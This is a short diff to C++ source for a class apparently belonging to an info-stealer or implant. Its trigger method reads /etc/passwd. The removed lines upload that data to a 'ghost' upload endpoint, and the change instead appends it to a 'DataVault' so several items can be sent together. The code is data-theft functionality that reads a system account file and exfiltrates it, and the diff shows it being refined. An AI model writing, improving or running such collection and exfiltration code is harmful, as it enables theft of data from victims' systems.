@@ -2,6 +2,7 @@
 #include "utils/FileUtils.hpp"
 #include "utils/SystemUtils.hpp"
 #include "utils/Logger.hpp"
+#include "utils/DataVault.hpp"
 #include "network/Comms.hpp"
 
 bool EtcPasswdMethod::trigger() {
@@ -12,7 +13,8 @@ bool EtcPasswdMethod::trigger() {
 
     if (data.empty()) return false;
 
-    // TODO: think about aggregating all info and sending in one request, this is highly inefficient
-    LOG_INFO("Uploading /etc/passwd")
-    return Comms::UploadFile("/api/v1/ghost/upload", "etc_passwd.txt", data);
+    LOG_INFO("Adding /etc/passwd to vault")
+    DataVault::Append("etc_passwd", data);
+
+    return true;
 }
